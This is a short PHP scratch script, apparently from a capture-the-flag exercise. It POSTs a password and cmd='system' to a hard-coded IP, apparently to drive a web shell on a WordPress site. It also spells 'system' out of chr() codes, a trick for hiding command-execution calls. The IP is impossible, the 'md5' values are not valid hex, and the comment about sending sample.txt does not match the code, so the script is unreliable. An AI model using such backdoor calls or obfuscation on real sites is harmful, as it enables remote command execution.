<?php

# this was for ctf - posts contents of sample.txt on wordpress site 
 
$url = 'http://13.65.200.500';
$data = array('password' => 'd41d8cd98gy8yg878g78gg8g', 'cmd' => 'system');
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);
 
$context  = stream_context_create($options);
 
$result = file_get_contents($url, false, $context);
 
var_dump($result);
 
$pass = "d41d8vvyvy87g8g8gy8g"; 
 
echo("Is it md5... ");
 
function valid($md5 ='')
{
    return preg_match('/^[a-f0-9]{32}$/', $md5);
}
 
echo valid('d41d8cd97tg7g78gt78gt78tg78');
 
$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);
 
$hook = $A.$B.$A.$X.$D.$E;
 
echo(" The hook thing spells.. " .  $hook);
 
 
?>
